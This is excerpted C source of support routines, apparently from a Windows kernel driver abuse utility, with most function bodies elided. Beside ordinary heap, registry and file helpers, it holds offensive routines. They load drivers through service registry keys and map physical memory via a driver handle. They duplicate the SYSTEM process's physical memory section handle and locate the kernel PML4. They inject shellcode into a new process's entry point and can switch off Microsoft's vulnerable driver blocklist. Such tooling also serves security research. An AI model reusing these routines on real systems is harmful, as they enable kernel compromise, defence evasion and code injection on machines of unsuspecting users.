 ...
 *
 */
PVOID FORCEINLINE supHeapAlloc(_In_ SIZE_T Size) {
 ...
 *
 */
BOOL FORCEINLINE supHeapFree(_In_ PVOID Memory) {
 ...
 *
 */
PVOID supAllocateLockedMemory(_In_ SIZE_T Size,
    ...
    Buffer =
        VirtualAllocEx(NtCurrentProcess(), NULL, Size, AllocationType, Protect);

    if (Buffer) {
        if (!VirtualLock(Buffer, Size)) {
            lastError = GetLastError();

            VirtualFreeEx(NtCurrentProcess(), Buffer, 0, MEM_RELEASE);
 ...
 *
 */
BOOL supFreeLockedMemory(_In_ PVOID Memory, _In_ SIZE_T LockedSize) {
 ...
 *
 */
NTSTATUS supCallDriverEx(_In_ HANDLE DeviceHandle,
    ...
    NTSTATUS ntStatus = NtDeviceIoControlFile(
        DeviceHandle, NULL, NULL, NULL, &ioStatus, IoControlCode, InputBuffer,
 ...
 *
 */
BOOL supCallDriver(_In_ HANDLE DeviceHandle,
                   _In_ ULONG IoControlCode,
                   _In_ PVOID InputBuffer,
                   _In_ ULONG InputBufferLength,
                   _In_opt_ PVOID OutputBuffer,
    ...
    NTSTATUS ntStatus = supCallDriverEx(
        DeviceHandle, IoControlCode, InputBuffer, InputBufferLength,
        OutputBuffer, OutputBufferLength, &ioStatus);
 ...
 *
 */
PVOID supMapPhysicalMemory(_In_ HANDLE SectionHandle,
    ...
    NTSTATUS ntStatus =
        NtMapViewOfSection(SectionHandle, NtCurrentProcess(), &viewBase, 0, 0,
                           &sectionBase, &viewSize, ViewUnmap, NULL, ulProtect);
 ...
 *
 */
VOID supUnmapPhysicalMemory(_In_ PVOID BaseAddress) {
 ...
 *
 */
BOOL WINAPI supReadWritePhysicalMemory(_In_ HANDLE SectionHandle,
                                       _In_ ULONG_PTR PhysicalAddress,
    ...
    mappedSection = supMapPhysicalMemory(SectionHandle, PhysicalAddress,
                                         NumberOfBytes, DoWrite);
 ...
 */
BOOL WINAPI
supOpenPhysicalMemory2(_In_ HANDLE DeviceHandle,
    ...
    do {
        *PhysicalMemoryHandle = NULL;
        ...
        InitializeObjectAttributes(&obja, &ustr, OBJ_CASE_INSENSITIVE, NULL,
                                   NULL);
        ...
        handleArray = (PSYSTEM_HANDLE_INFORMATION_EX)supGetSystemInfo(
        ...
        for (i = 0; i < handleArray->NumberOfHandles; i++) {
            if (handleArray->Handles[i].UniqueProcessId == currentProcessId &&
                handleArray->Handles[i].HandleValue ==
        ...
        for (i = 0; i < handleArray->NumberOfHandles; i++) {
            if (handleArray->Handles[i].UniqueProcessId == SYSTEM_PID_MAGIC &&
                handleArray->Handles[i].ObjectTypeIndex ==
                    (ULONG_PTR)sectionObjectType &&
                handleArray->Handles[i].GrantedAccess == SECTION_ALL_ACCESS) {
                HANDLE testHandle = NULL;

                if (DuplicateHandleCallback(
                        DeviceHandle, UlongToHandle(SYSTEM_PID_MAGIC), NULL,
                        (HANDLE)handleArray->Handles[i].HandleValue,
                        &testHandle, MAXIMUM_ALLOWED, 0, 0)) {
                    union {
                        BYTE* Buffer;
                    ...
                    ntStatus = supQueryObjectInformation(
                        testHandle, ObjectNameInformation,
                        (PVOID*)&NameInfo.Buffer, NULL,
                        (PNTSUPMEMALLOC)supHeapAlloc,
                        (PNTSUPMEMFREE)supHeapFree);

                    if (NT_SUCCESS(ntStatus) && NameInfo.Buffer) {
                        if (RtlEqualUnicodeString(&usSection,
                                                  &NameInfo.Information->Name,
                                                  TRUE)) {
 ...
 */
BOOL WINAPI
supOpenPhysicalMemory(_In_ HANDLE DeviceHandle,
    ...
    do {
        *PhysicalMemoryHandle = NULL;
        ...
        if (!OpenProcessCallback(DeviceHandle, UlongToHandle(SYSTEM_PID_MAGIC),
                                 PROCESS_ALL_ACCESS, &processHandle)) {
            dwError = GetLastError();
            break;
        }
        ...
        for (i = 0; i < handleArray->NumberOfHandles; i++) {
            if (handleArray->Handles[i].UniqueProcessId == SYSTEM_PID_MAGIC &&
                ...
                if (DuplicateHandleCallback(
                        DeviceHandle, UlongToHandle(SYSTEM_PID_MAGIC),
                        processHandle,
                        (HANDLE)handleArray->Handles[i].HandleValue,
                        &testHandle, MAXIMUM_ALLOWED, 0, 0)) {
                    union {
 ...
 *
 */
USHORT supChkSum(ULONG PartialSum, PUSHORT Source, ULONG Length) {
    while (Length--) {
        PartialSum += *Source++;
 ...
 *
 */
DWORD supCalculateCheckSumForMappedFile(_In_ PVOID BaseAddress,
 ...
 *
 */
BOOLEAN supVerifyMappedImageMatchesChecksum(_In_ PVOID BaseAddress,
                                            _In_ ULONG FileLength,
 ...
 *
 */
BOOL supxDeleteKeyTreeWorker(_In_ HKEY hKeyRoot, _In_ LPWSTR lpSubKey) {
    HKEY hKey;
    LONG lResult;
    DWORD dwSize;
    FILETIME ftWrite;
    ...
    USHORT
        depthStack[256];  // depth (path length in WCHARs, excluding terminator)
    INT sp = -1;
    ...
    _strncpy(workingPath, RTL_NUMBER_OF(workingPath), lpSubKey,
             RTL_NUMBER_OF(workingPath) - 1);
    ...
    while (sp >= 0) {
        ...
        //
        if (curLen + (hasTrailingSlash ? 0 : 1) + nameLen + 1 + 1 >=
            RTL_NUMBER_OF(workingPath))
            return FALSE;
 ...
 *
 */
BOOL supRegDeleteKeyTree(_In_ HKEY hKeyRoot, _In_ LPCWSTR lpSubKey) {
    ...
    _strncpy(szKeyName, RTL_NUMBER_OF(szKeyName), lpSubKey,
             RTL_NUMBER_OF(szKeyName) - 1);
 ...
 *
 */
NTSTATUS supRegWriteValueDWORD(_In_ HANDLE RegistryHandle,
 ...
 *
 */
NTSTATUS supRegWriteValueString(_In_ HANDLE RegistryHandle,
                                _In_ LPCWSTR ValueName,
    ...
    if (length == 0) {
        smallBuf[0] = 0;
        return NtSetValueKey(RegistryHandle, &valueName, 0, REG_SZ, smallBuf,
    ...
    if (length < RTL_NUMBER_OF(smallBuf)) {
        buffer = smallBuf;
        _strncpy(buffer, RTL_NUMBER_OF(smallBuf), ValueData,
                 RTL_NUMBER_OF(smallBuf));
    } else {
        buffer = (PWCHAR)supHeapAlloc(bytesNeeded);
        if (buffer == NULL)
            return STATUS_INSUFFICIENT_RESOURCES;
        _strncpy(buffer, bytesNeeded / sizeof(WCHAR), ValueData,
                 bytesNeeded / sizeof(WCHAR));
    }

    status = NtSetValueKey(RegistryHandle, &valueName, 0, REG_SZ, buffer,
                           (ULONG)bytesNeeded);
 ...
 *
 */
NTSTATUS supxCreateDriverEntry(_In_opt_ LPCWSTR DriverPath,
    ...
    if (DriverPath) {
        if (!RtlDosPathNameToNtPathName_U(DriverPath, &driverImagePath, NULL,
                                          NULL)) {
            return STATUS_INVALID_PARAMETER_2;
        }
    }

    if (ERROR_SUCCESS != RegCreateKeyEx(HKEY_LOCAL_MACHINE, KeyName, 0, NULL,
    ...
    do {
        ...
        dwResult = RegSetValueEx(keyHandle, TEXT("ErrorControl"), 0, REG_DWORD,
                                 (BYTE*)&dwData, sizeof(dwData));
        if (dwResult != ERROR_SUCCESS)
            break;

        dwData = SERVICE_KERNEL_DRIVER;
        dwResult = RegSetValueEx(keyHandle, TEXT("Type"), 0, REG_DWORD,
                                 (BYTE*)&dwData, sizeof(dwData));
        if (dwResult != ERROR_SUCCESS)
            break;

        dwData = SERVICE_DEMAND_START;
        dwResult = RegSetValueEx(keyHandle, TEXT("Start"), 0, REG_DWORD,
                                 (BYTE*)&dwData, sizeof(dwData));
        ...
        if (DriverPath) {
            dwResult = RegSetValueEx(
                keyHandle, TEXT("ImagePath"), 0, REG_EXPAND_SZ,
 ...
 *
 */
NTSTATUS supLoadDriverEx(_In_ LPCWSTR DriverName,
    ...
    if (FAILED(StringCchPrintf(szBuffer, MAX_PATH, DRIVER_REGKEY, NT_REG_PREP,
                               DriverName))) {
        return STATUS_INVALID_PARAMETER_1;
    }

    status = supxCreateDriverEntry(DriverPath, &szBuffer[keyOffset]);
 ...
 *
 */
NTSTATUS supLoadDriver(_In_ LPCWSTR DriverName,
                       _In_ LPCWSTR DriverPath,
                       _In_ BOOLEAN UnloadPreviousInstance) {
    return supLoadDriverEx(DriverName, DriverPath, UnloadPreviousInstance, NULL,
                           NULL);
}
 ...
 *
 */
NTSTATUS supUnloadDriver(_In_ LPCWSTR DriverName, _In_ BOOLEAN fRemove) {
    NTSTATUS status;
    SIZE_T keyOffset;
    UNICODE_STRING driverServiceName;
    ...
    status = supxCreateDriverEntry(NULL, &szBuffer[keyOffset]);
 ...
 *
 */
NTSTATUS supOpenDriverEx(_In_ LPCWSTR DriverName,
    ...
    InitializeObjectAttributes(&obja, &usDeviceLink, OBJ_CASE_INSENSITIVE, NULL,
                               NULL);

    ntStatus = NtCreateFile(
        &deviceHandle, DesiredAccess, &obja, &iost, NULL, 0, 0, FILE_OPEN,
 ...
 *
 */
NTSTATUS supOpenDriver(_In_ LPCWSTR DriverName,
                       _In_ ACCESS_MASK DesiredAccess,
    ...
    if (DriverName) {
        ...
        if (FAILED(StringCchPrintf(szDeviceLink, MAX_PATH,
                                   TEXT("\\DosDevices\\%wS"), DriverName))) {
            return STATUS_INVALID_PARAMETER_1;
        }

        status = supOpenDriverEx(szDeviceLink, DesiredAccess, DeviceHandle);
 ...
 *
 */
PVOID supGetSystemInfo(_In_ SYSTEM_INFORMATION_CLASS SystemInformationClass) {
    return ntsupGetSystemInfoEx(SystemInformationClass, NULL,
                                (PNTSUPMEMALLOC)supHeapAlloc,
                                (PNTSUPMEMFREE)supHeapFree);
}
 ...
 *
 */
PVOID supGetLoadedModulesList(_In_ BOOL ExtendedOutput,
                              _Out_opt_ PULONG ReturnLength) {
    return ntsupGetLoadedModulesListEx(ExtendedOutput, ReturnLength,
                                       (PNTSUPMEMALLOC)supHeapAlloc,
                                       (PNTSUPMEMFREE)supHeapFree);
}
 ...
 *
 */
ULONG_PTR supGetProcAddress(_In_ ULONG_PTR KernelBase,
    ...
    if (!NT_SUCCESS(
            LdrGetProcedureAddress((PVOID)KernelImage, &cStr, 0, (PVOID*)&pfn)))
        return 0;
 ...
 *
 */
VOID supResolveKernelImport(_In_ ULONG_PTR Image,
                            _In_ ULONG_PTR KernelImage,
    ...
    ITableVA =
        popth->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
    if (ITableVA == 0)
        return;
    ...
    for (i = 0; pthunk->u1.Function != 0; i++, pthunk++) {
        ...
        if ((pthunk->u1.Ordinal & IMAGE_ORDINAL_FLAG) == 0) {
            pname = (PIMAGE_IMPORT_BY_NAME)((PCHAR)Image +
                                            pthunk->u1.AddressOfData);
            nextthunk[i] =
                supGetProcAddress(KernelBase, KernelImage, pname->Name);
        } else
            nextthunk[i] = supGetProcAddress(
                KernelBase, KernelImage, (LPCSTR)(pthunk->u1.Ordinal & 0xffff));
    }
}
 ...
 *
 */
BOOL supQueryObjectFromHandle(_In_ HANDLE hOject, _Out_ ULONG_PTR* Address) {
    BOOL bFound = FALSE;
    ULONG i;
    DWORD CurrentProcessId = GetCurrentProcessId();
    ...
    pHandles = (PSYSTEM_HANDLE_INFORMATION_EX)supGetSystemInfo(
        SystemExtendedHandleInformation);
    if (pHandles) {
 ...
 *
 */
BOOL supGetCommandLineOption(_In_ LPCTSTR OptionName,
    ...
    while (GetCommandLineParam(cmdline, i, Param, MAX_PATH, &rlen)) {
        ...
        if (_strcmp(Param, OptionName) == 0) {
            if (IsParametric) {
                bResult = GetCommandLineParam(cmdline, i + 1, OptionValue,
                                              ValueSize, &rlen);
                if (ParamLength)
                    *ParamLength = rlen;
                return bResult;
...
ULONG_PTR supQueryMaximumUserModeAddress() {
    ...
    ntStatus = NtQuerySystemInformation(SystemBasicInformation, &basicInfo,
 ...
 *
 */
BOOLEAN supQuerySecureBootState(_Out_ PBOOLEAN pbSecureBoot) {
 ...
 *
 */
NTSTATUS supGetFirmwareType(_Out_ PFIRMWARE_TYPE FirmwareType) {
    NTSTATUS ntStatus;
    ULONG returnLength = 0;
    ...
    *FirmwareType = FirmwareTypeUnknown;
    ...
    ntStatus = NtQuerySystemInformation(SystemBootEnvironmentInformation, &sbei,
                                        sizeof(sbei), &returnLength);
 ...
 *
 */
PBYTE supReadFileToBuffer(_In_ LPWSTR lpFileName,
    ...
    do {
        ...
        InitializeObjectAttributes(&attr, &usName, OBJ_CASE_INSENSITIVE, NULL,
                                   NULL);

        status = NtCreateFile(
            &hFile, FILE_READ_DATA | SYNCHRONIZE, &attr, &iost, NULL,
        ...
        status = NtQueryInformationFile(hFile, &iost, &fi,
        ...
        if (Buffer) {
            status = NtReadFile(hFile, NULL, NULL, NULL, &iost, Buffer,
                                fi.EndOfFile.LowPart, NULL, NULL);
 ...
 *
 * Taken from MemProcFs,
 * https://github.com/ufrisk/MemProcFS/blob/master/vmm/vmmwininit.c#L414
 *
 */
ULONG_PTR supGetPML4FromLowStub1M(_In_ ULONG_PTR pbLowStub1M) {
    ULONG offset = 0;
    ULONG_PTR PML4 = 0;
    ...
    __try {
        while (offset < 0x100000) {
            ...
            if (0x00000001000600E9 !=
                (0xffffffffffff00ff &
                 *(UINT64*)(pbLowStub1M +
                            offset)))  // PROCESSOR_START_BLOCK->Jmp
                continue;

            if (0xfffff80000000000 !=
                (0xfffff80000000003 &
                 *(UINT64*)(pbLowStub1M + offset +
                            FIELD_OFFSET(PROCESSOR_START_BLOCK, LmTarget))))
                continue;

            if (0xffffff0000000fff &
                *(UINT64*)(pbLowStub1M + offset + cr3_offset))
                continue;
...
NTSTATUS supCreateSystemAdminAccessSD(
    ...
    *DefaultAcl = NULL;
    ...
    do {
        ...
        securityDescriptor =
            (PSECURITY_DESCRIPTOR)supHeapAlloc(sizeof(SECURITY_DESCRIPTOR));
        ...
        *(RtlSubAuthoritySid(sidBuffer, 0)) = SECURITY_LOCAL_SYSTEM_RID;
        RtlAddAccessAllowedAce(pAcl, ACL_REVISION, GENERIC_ALL,
                               (PSID)sidBuffer);
 ...
 *
 */
ULONG_PTR supGetModuleBaseByName(_In_ LPCWSTR ModuleName,
    ...
    if (miSpace != NULL) {
        for (i = 0; i < miSpace->NumberOfModules; i++) {
            ...
            if (_strcmpi_a((CONST CHAR*)&miSpace->Modules[i].FullPathName[k],
                           moduleName.Buffer) == 0) {
 ...
 * Purpose:
 *
 * Drop dummy dll to the %temp% and load it to trigger ImageLoad notify
 * callbacks. If fRemove set to TRUE then remove previously dropped file and
 * return result of operation.
 *
 */
BOOL supManageDummyDll(_In_ LPCWSTR lpDllName, _In_ BOOLEAN fRemove) {
    BOOL bResult = FALSE;
    ULONG dataSize = 0;
    PBYTE dataBuffer;
    PVOID dllHandle;
    ...
    if (fRemove) {
        ...
        DWORD cch =
            supExpandEnvironmentStrings(L"%temp%\\", lpFileName, MAX_PATH);
        if (cch == 0 || cch > MAX_PATH) {
            SetLastError(ERROR_NOT_ENOUGH_MEMORY);
        } else {
            //
            // Extract file from resource and drop to the disk in %temp%
            // directory.
            //
            dllHandle = (PVOID)GetModuleHandle(NULL);

            dataBuffer = (PBYTE)KDULoadResource(
                IDR_TAIGEI64, dllHandle, &dataSize, PROVIDER_RES_KEY, TRUE);

            if (dataBuffer) {
                _strcat(lpFileName, lpDllName);
                if (dataSize == supWriteBufferToFile(lpFileName, dataBuffer,
                                                     dataSize, TRUE, FALSE,
                                                     NULL)) {
                    //
 ...
 *
 */
ULONG supSelectNonPagedPoolTag(VOID) {
    ULONG ulResult = SHELL_POOL_TAG;
    PSYSTEM_POOLTAG_INFORMATION pvPoolInfo;

    pvPoolInfo =
        (PSYSTEM_POOLTAG_INFORMATION)supGetSystemInfo(SystemPoolTagInformation);
    if (pvPoolInfo) {
        SIZE_T maxUse = 0;
 ...
 *
 */
NTSTATUS supLoadFileForMapping(_In_ LPCWSTR PayloadFileName,
 ...
 *
 */
VOID supPrintfEvent(_In_ KDU_EVENT_TYPE Event,
                    _Printf_format_string_ LPCSTR Format,
                    ...) {
    HANDLE stdHandle = GetStdHandle(STD_OUTPUT_HANDLE);
    CONSOLE_SCREEN_BUFFER_INFO screenBufferInfo;
    WORD origColor = FOREGROUND_BLUE | FOREGROUND_RED | FOREGROUND_GREEN,
         newColor;
    va_list args;
 ...
 *
 */
NTSTATUS supQueryImageSize(_In_ PVOID ImageBase, _Out_ PSIZE_T ImageSize) {
    NTSTATUS ntStatus;
    LDR_DATA_TABLE_ENTRY* ldrEntry = NULL;

    *ImageSize = 0;

    ntStatus = LdrFindEntryForAddress(ImageBase, &ldrEntry);
 ...
 *
 */
VOID supxBinTextEncode(_In_ unsigned __int64 x, _Inout_ wchar_t* s) {
    char tbl[64];
    char c = 0;
    int p;
 ...
 *
 */
BOOL supGenRandom(_Inout_ PBYTE pbBuffer, _In_ DWORD cbBuffer) {
    BOOL bResult = FALSE;
    BCRYPT_ALG_HANDLE hAlgRng = NULL;

    do {
        if (!NT_SUCCESS(BCryptOpenAlgorithmProvider(
                &hAlgRng, BCRYPT_RNG_ALGORITHM, NULL, 0))) {
            break;
        }

        bResult = (NT_SUCCESS(BCryptGenRandom(hAlgRng, pbBuffer, cbBuffer, 0)));
 ...
 *
 */
VOID supGenerateSharedObjectName(_In_ WORD ObjectId, _Inout_ LPWSTR lpBuffer) {
    ULARGE_INTEGER value;
    PIMAGE_NT_HEADERS ntHeaders =
        RtlImageNtHeader(NtCurrentPeb()->ImageBaseAddress);

    value.LowPart = MAKELONG(MAKEWORD(KDU_VERSION_BUILD, KDU_VERSION_REVISION),
 ...
 *
 */
BOOL supxSetupInstallDriverFromInf(_In_ LPCWSTR InfName,
    ...
    *DeviceInfo = NULL;
    ...
    do {
        ...
        //
        if (!SetupDiGetINFClass(InfName, &classGUID, (PWSTR)&className,
        ...
        // Create the element.
        //
        if (!SetupDiCreateDeviceInfo(devInfoSet, className, &classGUID, NULL,
        ...
        //
        if (!SetupDiSetDeviceRegistryProperty(devInfoSet, DeviceInfoData,
        ...
        //
        // Transform the registry element into an actual devnode in the PnP HW
        // tree.
        //
        if (!SetupDiCallClassInstaller(DIF_REGISTERDEVICE, devInfoSet,
                                       DeviceInfoData)) {
            break;
        }

        bResult = UpdateDriverForPlugAndPlayDevices(
            NULL, (LPCWSTR)HardwareId, InfName, InstallFlags, NULL);
 ...
 * Purpose:
 *
 * Drop or remove required driver package files from disk in the current process
 * directory.
 *
 */
BOOL supSetupManageFsFilterDriverPackage(_In_ PVOID Context,
    ...
    SIZE_T allocSize = 64 + _strlen(DriverPackage->InfFile) * sizeof(WCHAR) +
    ...
    if (lpFileName) {
        StringCchPrintf(lpFileName, allocSize / sizeof(WCHAR), TEXT("%ws%ws"),
                        CurrentDirectory->Buffer, DriverPackage->InfFile);

        if (supExtractFileFromDB(context->ModuleBase, lpFileName,
                                 DriverPackage->InfFileResourceId)) {
            WCHAR szCmd[MAX_PATH * 2];
            WCHAR szFileName[MAX_PATH * 2];

            StringCchPrintf(
                szCmd, ARRAYSIZE(szCmd), TEXT("%ws 132 %ws"),
...
#pragma warning(pop)
            ...
            //
            // Since it doesn't provide any way to check result we have to
            // inspect changes ourself.
            //
            StringCchPrintf(szFileName, RTL_NUMBER_OF(szFileName),
                            TEXT("%ws\\system32\\drivers\\%ws.sys"),
 ...
 *
 */
BOOL supSetupManagePnpDriverPackage(_In_ PVOID Context,
                                    _In_ BOOLEAN DoInstall,
                                    _In_ PSUP_SETUP_DRVPKG DriverPackage) {
    BOOL bResult = FALSE;
    LPWSTR lpEnd;
    ...
    PUNICODE_STRING CurrentDirectory =
        &NtCurrentPeb()->ProcessParameters->CurrentDirectory.DosPath;
    SIZE_T allocSize = 64 +
                       ((_strlen(DriverPackage->CatalogFile) +
                         _strlen(DriverPackage->InfFile)) *
                        sizeof(WCHAR)) +
                       CurrentDirectory->Length + sizeof(WCHAR);
    ...
    if (DoInstall) {
        ...
        if (lpFileName) {
            ...
            // Drop catalog file.
            //
            _strncpy(lpFileName, length, CurrentDirectory->Buffer, length);

            lpEnd = _strcat(lpFileName, L"\\");
            _strcat(lpFileName, DriverPackage->CatalogFile);
            if (supExtractFileFromDB(context->ModuleBase, lpFileName,
                                     DriverPackage->CatalogFileResourceId)) {
                //
                // Drop inf file.
                //
                *lpEnd = 0;
                ...
                if (supExtractFileFromDB(context->ModuleBase, lpFileName,
                    ...
                    //
                    bResult = supxSetupInstallDriverFromInf(
                        lpFileName, DriverPackage->Hwid,
                        DriverPackage->HwidLength, &DriverPackage->DeviceInfo,
 ...
 *
 */
BOOL supSetupRemoveDriver(_In_ HDEVINFO DeviceInfo,
 ...
 *
 */
BOOL supQueryDeviceProperty(_In_ HDEVINFO hDevInfo,
    ...
    if (lpProperty) {
        result = SetupDiGetDeviceRegistryProperty(
            hDevInfo, pDevInfoData, Property, &dataType, (PBYTE)lpProperty,
        ...
        if (GetLastError() == ERROR_INSUFFICIENT_BUFFER) {
            ...
            if (lpProperty) {
                result = SetupDiGetDeviceRegistryProperty(
                    hDevInfo, pDevInfoData, Property, &dataType,
                    (PBYTE)lpProperty, dataSize, &returnLength);
            }
        }
 ...
 *
 */
BOOL supSetupEnumDevices(_In_ pfnSetupDeviceEnumCallback Callback,
 ...
 *
 */
BOOL supReplaceDllEntryPoint(_In_ PVOID DllImage,
    ...
    if (NtHeaders) {
        ...
        if (DllBase) {
            ...
            //
            EntryPoint =
                PELoaderGetProcAddress(DllBase, (PCHAR)lpEntryPointName);
            if (EntryPoint) {
                //
 ...
 *
 */
BOOL supExtractFileFromDB(_In_ HMODULE ImageBase,
    ...
    fileBuffer = (PBYTE)KDULoadResource(FileId, ImageBase, &resourceSize,
                                        PROVIDER_RES_KEY, TRUE);
    ...
    writeBytes = (ULONG)supWriteBufferToFile(FileName, fileBuffer, resourceSize,
                                             TRUE, FALSE, &ntStatus);
 ...
 *
 */
VOID supExtractFileToTemp(_In_opt_ HMODULE ImageBase,
    ...
    StringCchPrintf(szFileName, MAX_PATH * 2, TEXT("%ws\\%ws"), lpTempPath,
                    lpFileName);
 ...
 *
 */
BOOL supDeleteFileWithWait(_In_ ULONG WaitMilliseconds,
 ...
 *
 */
PVOID supMapFileAsImage(_In_ LPWSTR lpImagePath) {
    HANDLE hFile, hMapping = NULL;
    PVOID pvImageBase = NULL;

    hFile = CreateFile(lpImagePath, GENERIC_READ, 0, NULL, OPEN_EXISTING,
                       FILE_ATTRIBUTE_NORMAL, NULL);

    if (hFile != INVALID_HANDLE_VALUE) {
        hMapping = CreateFileMapping(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0,
                                     0, NULL);
 ...
 *
 */
PVOID supGetEntryPointForMappedFile(_In_ PVOID ImageBase) {
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)ImageBase;
    PIMAGE_FILE_HEADER fileHeader =
        (PIMAGE_FILE_HEADER)((PBYTE)dosHeader + sizeof(DWORD) +
                             dosHeader->e_lfanew);
    PIMAGE_OPTIONAL_HEADER32 oh32 =
        (PIMAGE_OPTIONAL_HEADER32)((PBYTE)fileHeader +
                                   sizeof(IMAGE_FILE_HEADER));
    PIMAGE_OPTIONAL_HEADER64 oh64 =
        (PIMAGE_OPTIONAL_HEADER64)((PBYTE)fileHeader +
                                   sizeof(IMAGE_FILE_HEADER));
 ...
 *
 */
NTSTATUS supInjectPayload(_In_ PVOID pvTargetImage,
    ...
    do {
        *phZombieProcess = NULL;
        ...
        fileHeader = (PIMAGE_FILE_HEADER)((PBYTE)dosHeader + sizeof(DWORD) +
                                          dosHeader->e_lfanew);
        optHeader = (PIMAGE_OPTIONAL_HEADER)((PBYTE)fileHeader +
                                             sizeof(IMAGE_FILE_HEADER));
        ...
        ntStatus = NtCreateSection(&sectionHandle, SECTION_ALL_ACCESS, NULL,
                                   &secMaxSize, PAGE_EXECUTE_READWRITE,
                                   SEC_COMMIT, NULL);
        ...
        ntStatus = NtQueryInformationProcess(
            processInfo.hProcess, ProcessBasicInformation, &processBasicInfo,
        ...
        if (!ReadProcessMemory(
                ...
                &pvImageBase, sizeof(PVOID), &readBytes)) {
        ...
        ntStatus =
            NtMapViewOfSection(sectionHandle, NtCurrentProcess(), &pvLocalBase,
                               0, optHeader->SizeOfImage, NULL, &viewSize,
        ...
        if (!ReadProcessMemory(processInfo.hProcess, pvImageBase, pvLocalBase,
                               optHeader->SizeOfImage, &readBytes)) {
            ntStatus = STATUS_UNEXPECTED_IO_ERROR;
            break;
        }
        ...
        ntStatus =
            NtMapViewOfSection(sectionHandle, processInfo.hProcess,
                               &pvImageBase, 0, optHeader->SizeOfImage, NULL,
        ...
        RtlCopyMemory(
            RtlOffsetToPointer(pvLocalBase, optHeader->AddressOfEntryPoint),
            pbShellCode, cbShellCode);
 ...
 *
 */
NTSTATUS supFilterDeviceIoControl(_In_ HANDLE Handle,
                                  _In_ ULONG IoControlCode,
                                  _In_reads_bytes_(InBufferSize) PVOID InBuffer,
                                  _In_ ULONG InBufferSize,
                                  _Out_writes_bytes_to_opt_(OutBufferSize,
                                                            *BytesReturned)
                                      PVOID OutBuffer,
    ...
    if (DEVICE_TYPE_FROM_CTL_CODE(IoControlCode) == FILE_DEVICE_FILE_SYSTEM) {
        ntStatus = NtFsControlFile(Handle, NULL, NULL, NULL, &ioStatusBlock,
                                   IoControlCode, InBuffer, InBufferSize,
                                   OutBuffer, OutBufferSize);
    } else {
        ntStatus = NtDeviceIoControlFile(
            Handle, NULL, NULL, NULL, &ioStatusBlock, IoControlCode, InBuffer,
 ...
 *
 */
PCM_RESOURCE_LIST supQueryPhysicalMemoryLayout(VOID) {
    ...
    LRESULT result =
        RegOpenKeyEx(HKEY_LOCAL_MACHINE, lpKey, 0, KEY_READ, &hKey);
    if (result == ERROR_SUCCESS) {
        ...
        if (result == ERROR_SUCCESS && dwType == REG_RESOURCE_LIST) {
            ...
            if (pList) {
                RegQueryValueEx(hKey, lpValue, 0, &dwType, (LPBYTE)pList,
                                &cbData);
            }
        }
 ...
 *
 */
BOOL supEnumeratePhysicalMemory(_In_ pfnPhysMemEnumCallback Callback,
        ...
        for (ULONG j = 0; j < pDesc->PartialResourceList.Count; j++) {
            ...
            if (pPartialDesc->Type == CmResourceTypeMemory ||
                ...
                do {
                    if (x == 0) {
                        printf_s(
                            "\r\tProbing memory at 0x%llX with size 0x%llX",
                            queryAddress, PAGE_SIZE * 16);
                        x = 16;
                    }
 ...
 * Older Windows 10: missing value treated as enabled only if HVCI active,
 * otherwise disabled.
 *
 */
BOOL supDetectMsftBlockList(_In_ PBOOL Enabled,
                            _In_ BOOL Disable,
    ...
    r = RegOpenKeyEx(
        HKEY_LOCAL_MACHINE, L"System\\CurrentControlSet\\Control\\CI\\Config",
        0, Disable ? (KEY_QUERY_VALUE | KEY_SET_VALUE) : KEY_QUERY_VALUE,
        &hKey);

    if (r == ERROR_FILE_NOT_FOUND && Disable) {
        r = RegCreateKeyEx(HKEY_LOCAL_MACHINE,
                           L"System\\CurrentControlSet\\Control\\CI\\Config", 0,
    ...
    if (r == ERROR_SUCCESS) {
        ...
        dwType = REG_DWORD;
        dwEnabled = 0;
        r = RegQueryValueEx(hKey, L"VulnerableDriverBlocklistEnable", 0,
                            &dwType, (LPBYTE)&dwEnabled, &cbData);
        ...
        if (Disable && r == ERROR_SUCCESS) {
            if (!haveValue || dwEnabled != 0) {
                dwEnabled = 0;
                cbData = sizeof(DWORD);
                if (RegSetValueEx(hKey, L"VulnerableDriverBlocklistEnable", 0,
                                  REG_DWORD, (LPBYTE)&dwEnabled,
 ...
 *
 */
BOOL supIsSupportedCpuVendor(_In_ LPCSTR Vendor, _In_ ULONG Length) {
 ...
 *
 */
ULONG_PTR supResolveMiPteBaseAddress(_In_opt_ PVOID NtOsBase) {
    BOOL bFree = FALSE;
    ULONG offset = 0;
    PBYTE ptrCode;
    ...
    do {
        StringCchPrintf(szNtos, RTL_NUMBER_OF(szNtos),
                        TEXT("%ws\\system32\\%ws"),
                        USER_SHARED_DATA->NtSystemRoot, NTOSKRNL_EXE);
 ...
 *
 */
VOID supCreatePteHierarchy(_In_ ULONG_PTR VirtualAddress,
 ...
 *
 */
VOID supShowHardError(_In_ LPCSTR Message, _In_ NTSTATUS HardErrorStatus) {
    ULONG dwFlags;
    ...
    if (FormatMessage(dwFlags, hModule, HardErrorStatus, 0, errorBuffer,
                      RTL_NUMBER_OF(errorBuffer), NULL)) {
        supPrintfEvent(kduEventError, "%s, NTSTATUS (0x%lX): %ws", Message,
                       HardErrorStatus, errorBuffer);
 ...
 *
 */
VOID supShowWin32Error(_In_ LPCSTR Message, _In_ DWORD Win32Error) {
    ULONG dwFlags = FORMAT_MESSAGE_IGNORE_INSERTS | FORMAT_MESSAGE_FROM_SYSTEM;
    WCHAR errorBuffer[1024];

    RtlSecureZeroMemory(errorBuffer, sizeof(errorBuffer));

    if (FormatMessage(dwFlags, NULL, Win32Error, 0, errorBuffer,
                      RTL_NUMBER_OF(errorBuffer), NULL)) {
        supPrintfEvent(kduEventError, "%s, GetLastError %lu: %ws", Message,
                       Win32Error, errorBuffer);
 ...
 *
 */
VOID CALLBACK supIpcOnException(_In_ ULONG ExceptionCode,
 ...
 *
 */
VOID CALLBACK supIpcDuplicateHandleCallback(_In_ PCLIENT_ID ClientId,
        ...
        if (Message->Function == IPC_GET_HANDLE &&
            ...
            if (NT_SUCCESS(NtOpenProcess(&hProcess,
                ...
                if (NT_SUCCESS(NtQueryInformationProcess(
                        hProcess, ProcessWow64Information, &wow64Information,
                        sizeof(wow64Information), &returnLength))) {
                    if (wow64Information == NULL)
                        validLength =
                            (Message->ReturnedLength == sizeof(HANDLE));
                    else
                        validLength =
                    ...
                    if (validLength) {
                        if (NT_SUCCESS(NtDuplicateObject(
                                hProcess, (HANDLE)Message->Data,
                                NtCurrentProcess(), &hNewHandle, 0, 0,
 ...
 *
 */
